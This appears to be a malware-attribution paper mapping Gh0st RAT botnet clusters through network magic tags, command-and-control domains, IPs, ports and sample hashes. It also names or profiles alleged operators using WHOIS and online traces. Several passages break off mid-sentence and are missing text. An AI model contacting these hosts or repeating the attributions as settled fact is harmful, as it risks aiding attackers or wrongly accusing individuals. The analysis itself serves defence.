Introduction
Gh0st Rat is a well-known Chinese remote access trojan which was originally made by
C.Rufus Security Team several years ago. Just as with other well-featured “off-the-shelf”
trojans like Poison Ivy, Hupigon and DarkComet it has been used by all sorts of people – from
the script kiddie next door to resourceful targeted attack actors (1)
Cybercriminals use off-the-shelf malware not only because it’s easy and cheap. They also use
it because it’s hard to track. Anybody could use this malware, so the criminal could be
anybody. However, this changes somewhat when they start modifying the code. The
malware now becomes somewhat attributable and can be connected to known cases and
criminal groups. This document is the result of examining selected common traits between
some 1200+ Gh0st Rat program files (samples) with the help of Maltego, a tool to visualize
data connections. The samples were processed by us in a timeframe of approximately six
months, from August 2011 to February 2012.
In this study we attempt to map out what logical connections do exist between different
Gh0st botnet campaigns. This is important because it gives an indication of the scale of
operation and sometimes what the aims of the campaigns are, and this can be valuable for
risk analysis. Additional data produced by the study may be used for risk mitigation.

The variants
The Gh0st Rat source code (version 3.6) is freely available on the Internet, something that
has made it quite popular and sparked a multitude of modifications. The resulting trojan can
be hard to recognize as Gh0stRat, as attackers ditch various parts of the code that they don't
need and add other functionality. In addition, the trojan is packaged in different ways –
standalone, glued together with other files, included in self extracting archives. It is
frequently obfuscated and compressed.
As a result of all this, antivirus naming is variable, to put it mildly. Most antivirus detections
today are automatically generated, resulting in names thought out by machines. Quick, but
containing information only machines find interesting.
The most stable indicator of being faced with a Gh0stRat is its network communication. It is
well documented and quite distinctive, as it always begins with a “magic word” which in its
default configuration is “Gh0st” – thus Gh0st Rat. Below is a typical packet (content data
blurred)

Fig 1 The fields are magic identifier (‘Gh0st’), size of packet, size of uncompressed packet, and lz-compressed data
containing information about the compromised computer.

This magic tag is very easy to spot in network traffic, so the bad guys have come up with a
countermeasure. They use other magics. I searched our in-house Malware Analyzer G2
(MAG2) pcaps for network traffic that matched the Gh0st packet format, and this showed
about 50 different magics from the last few months. There are many more in existence –
some are shown in Table 2, but as we had no traffic data on these, they were not
investigated.

Table 2. Known Gh0st magics not investigated in this paper.
The length of the magic is by default 5 bytes, but this is not the case for all variants. In Table
1 there are magics with non-standard length – “Spidern” and “W0LFKO” – and we have seen
others that were not included in this investigation, like “DrAgOn” and “QQ_124971919”.
The Spidern variant is non-standard in another way as well. It does not compress its network
traffic, something most other Gh0st do. However, when looking at the code in the
disassembler IDA Pro, the code relationship is clearly visible.

Clusters and links
Clusters are composed of samples that share common traits. Usually this will be common
magic tag, but this is not always the case. Sometimes clusters can form around other
parameters, such as common command & control (C&C) infrastructure. Logical links
between clusters occur when samples, infrastructure components or other factors exhibit
traits that belong in more than one cluster. For example, a sample with a magic of “cb1st”
obviously belongs in the cb1st cluster, but if the C&C server it connects to also accepts
connections from samples using the magic “whmhl”, then there is a logical link between the
cb1st and whmhl clusters. The strength of such links varies, as there always are possible
sources of error which are difficult to map out fully. Such uncertainties can be to what extent
is a malware variation shared or sold, or to what extent is command & control infrastructure
hired out or shared.
Because of these uncertainties, we will only point out where links do exist, without offering
hard conclusions.

Overview plot – with Gh0st

Fig 3 Overview with the Gh0st cluster

This mosquito swarm consists of trojan files, interconnected primarily by their magic tag, but
also by whatever other factor shared with other samples – which C&C server they dial back
to, and sometimes which IP address this resolves to. The large kludge in the middle is the
default Gh0st group totaling 522 nodes.
A better overview is perhaps gained by removing the “Gh0st” cluster from the graph, as it is
the default configuration and not usable for connecting clusters. Doing so results in a smaller
set of more distinct clusters, where the connections are more visible.

Overview plot – without Gh0st

Fig 4 Overview without the Gh0st cluster

The clusters that link together form clusters of clusters. Stealing unashamedly from
astronomy, let’s call these superclusters. How such superclusters are linked together is
detailed in the chapters that cover individual clusters later in this paper.

Supercluster one

This collection of linked clusters contain some of the most populous in the whole set. They
are linked through the usage of the same C&C servers, through the same malware, and
through the same observed network traffic. The links running through the PCRat cluster are
dotted red as they are presumably weaker than the others.

Supercluster two

Supercluster two contains some small and medium size nodes, and indeed one cluster,
IM007, that has no registered samples in this sample set. Some samples from these clusters
have exhibited behavior indicating that they have been used in connection with game
account theft.

Example botnet infrastructure: wk1888.com
A large amount of samples connected to www.wk1888.com. This host accepted connections
from at least two botnet clusters – Gh0st on port 8000, and cb1st on port 8181. We have
also seen Gh0st samples attempting to connect on port 8080 without being able to establish
communication.
This multi-botnet support appears usually to be related to timing. Based on the header
timestamp of the trojan files, the port 8181 cb1st samples were predominantly created MayJune 2011, while the port 8000 Gh0st samples were created Sept-Oct 2011.

WK1888.COM has resolved to many IP addresses over time, all belonging to Krypt
Technologies [AS 35908], a US-based VPS hosting service. At the time of writing the IP is
174.139.51.150. The same WHOIS info points to the domains af0575.com and fz0575.com,
both associated with earlier Gh0st Rat samples, and to the domains wt1888.com and

about problems with the registration of the domain www.sock8.com, which he claims he has
bought from a registered seller on taobao.com. Taobao is the Chinese version of eBay.

This post was made May 27th 2011. The WHOIS info for the sock8.com domain shows that
May 19th it was apparently reclaimed by Netfirms and returned to a parking IP. Before this,
the domain was registered by one “bingxian feng”:

In the period from the domain was registered by Bingxian Feng April 11th to its apparent
seizure in May a number of Ghost trojans surfaced which connected to the sock8 domain.
These had an apparent compile date April 12th and 13th.
Googling for Feng’s email address in the WHOIS shows that it is used for registering literally
hundreds of domains. Not only that, but it turns out that this player is well known
domestically in China (5), where this person allegedly has been involved in pornography,
mobile phone scams, game theft, and phishing attacks against among others People’s bank

This domain is the second of the two main hubs controlling the cb1st cluster. As previously
mentioned ddos.pk39.com also operates C&C for the whmhl cluster, and the host
down.pk39.com has acted as download server for other malware, typically DDOS trojans of
various kinds.

This is not the only defacement attributable to CǒCǒ – his name is found several places in
similar fashion. He also appears to use another handle frequently associated with hacking.
These handles appear to match the online profile of a male in his mid-twenties, living in
Changzhou in the Jiangsu province of China. He appears to be involved in many other
projects, from Android development to network security tools. The word “Ghost” is ironically
used in a lot of his projects.

Individual clusters
What follows is a listing and description of the individual botnet clusters. This is fairly
lengthy, so feel free to skip to Conclusion towards the end of the document.

Some explanation to the individual cluster graphs to come:
Brown nodes are samples
Blue nodes are malware families (i.e. usually Gh0st variants)
Yellow nodes are C&C servers (hardcoded IP or DNS name)
Purple nodes are resolved IP addresses

Cluster: 7hero

The 7hero cluster has two samples in the set. It is linked with the PCRat cluster through the
shared IP address 61.147.123.11 between the PCRat server at 429861812.3322.org and the
7hero C&C server at z429861812.3322.org. This could have been a coincidence - however,
they both also connected at port 4928, something that only these two samples in the whole
test set did.
z429861812.3322.org is also used as C&C for samples in the Gh0st cluster.

Cluster: ByShe

The ByShe cluster is interesting, as it has been documented used in targeted attacks against
Tibetan groups (6) and also connected with the Nitro attacks (7). Five samples exist in this
cluster, though no other clusters links with it.

Cluster: cb1st

The cb1st cluster is one of the larger, with 154 samples. The major C&C’s here are
www.wk1888.com and www.pk39.com. The wk1888.com host also acts as C&C for many
samples in the Gh0st cluster. cb1st is linked with the KrisR, XDAPR and FKJP3 clusters
through the C&C at daduji.3322.org. The www.pk39.com host links cb1st with the whmhl
cluster through observed traffic (see whmhl).

Cluster: IM007

The IM007 cluster surprisingly contains no samples. The reason it exists at all is that we have
logged several C&C servers replying with this magic tag, so it is a reasonable assumption that
there must exist samples that follow this protocol. The servers we have seen with this
behavior have been used by the BeiJi, BEiLa and Wangz clusters, thus linking these.
In at least two cases we have seen samples from these clusters showing images of Dungeon
Fighter Online virtual items when run, apparently as a lure for game account theft.

Cluster: MoZhe

This cluster consists of 87 samples. Most of these connect back to b2bweb.3322.org. MoZhe
is linked with
X6RAT: common C&C at ingalar.3322.org
Winds: common C&C at hkl8973875.3322.org
Additional links are seen through observed traffic.

Cluster: OXXMM

The OXXMM cluster contains eight samples. It connects with the Gh0st main cluster through
common C&C at a6422563.vicp.net and to the LURK0 cluster through common C&C at
218.28.72.138.

Cluster: PCRat

This cluster contains 25 samples, and is linked with the HEART cluster (see HEART), the 7hero
cluster (see 7hero) as well as the main Gh0st cluster through the common C&C at
tajs.3322.org. It is also linked to the Winds cluster through common C&C at mstsc5.3322.org.
PCRat samples have been documented used against Uyghur groups (11).
It is debatable how valid the PCRat connections are. There is apparently a commercially
available modification of Gh0st rat called PCRat, which we have not yet seen copies of. If
that kit uses the PCRat magic tag as there is reason to suspect, this cluster is of little value.

Cluster: URATU

The URATU cluster contains three samples. It appears unconnected with other clusters.
However, recently it has been connected with attacks on Nepalese Government websites
(12).

Cluster: W0LFKO

The W0LFKO cluster consists of one sample. It is linked to the Wangz cluster by the C&C
a1019500182.3322.org which replies “W0LFKO” when connection is attempted.

Cluster: Wangz

There are eight samples in the Wangz cluster. Wangz links with W0LFKO (see W0LFKO),
IM007 (see IM007) clusters, and also with Xjjhi cluster through observed communication
from the Wangz C&C a6603892.gicp.net.

Cluster: whmhl

The whmhl cluster consists of 9 samples; actually only 8 are Gh0stRats. The last sample is a
DarkShell ddos bot. It is included because it links this cluster with another.
The DarkShell bot connected to ddos.pk39.com on port 5566. This resolved to the same IP as
www.pk39.com, the C&C server for the cb1st cluster. The pcap from this connection reveals
that ddos.pk39.com replies with “whmhl”. Gotcha.

Cluster: Winds

The Winds cluster encompasses 21 samples. It is linked with the Tyjhu cluster (see Tyjhu),
the PCRat cluster (see PCRat) and the MoZhe cluster (see MoZhe).

Cluster: World

The World cluster consists of seven samples.
Samples in this cluster all give the impression that they use hardcoded IP addresses for their
C&C communication. This is because the real C&C ip is not stored in the executable, but
exists base64 encoded in a text file downloaded from a remote site. Thus these files are
shown with two C&C connections.
This cluster does not seem linked with other clusters. However, there is a strong
resemblance between these samples and some samples in the Wangz cluster (e.g.
c577b5a8d07982a2c6c42a7352c0cef8).

Cluster: XDAPR

The XDAPR cluster contains 28 samples. It is linked with the KrisR, HXWAN, cb1st, FKJP3 and
Lyyyy clusters. (See KrisR).

Cluster: xhjyk

The xhjyk cluster consists of one sample. Its C&C server, wo379733061.3322.org, is used by
another sample (MD5 2f463a39c10d507b4295e16b7b4e0033) which also connects to
wk1888.com, the C&C for Gh0st and the c1bst clusters. It’s also worth noting that one of the
C&C’s for the KrisR cluster is wo379733063.3322.org – only one digit different from this C&C,
and corroborates the impression that the KrisR and cb1st clusters are connected.

Conclusions
This study shows the presence of several logical links between different Ghost campaigns:
Links between malware type (in this case illustrated by the network protocol magic tag),
links in the C&C infrastructure and to some extent links in the registration information.
Due to the necessary scope limitation, many other links had to remain unexamined.
However, the present work shows that some of the most active and prolific malware
campaigns share enough connections indicate that the same groups or individuals are
involved.
In the cases where we have been able to say something about the entities responsible for
the attacks, it seems apparent that the persons involved can be considered career criminals.
These are people that have their hand in many different types of online crime, have been
doing it for quite some time, and often target victims inside China itself.
Smaller clusters are in many ways more interesting. They are often more difficult to track, as
they obviously leave less clues as to who is behind the attack and what the purpose is.
Clusters that have been involved in targeted attacks typically belong to these.
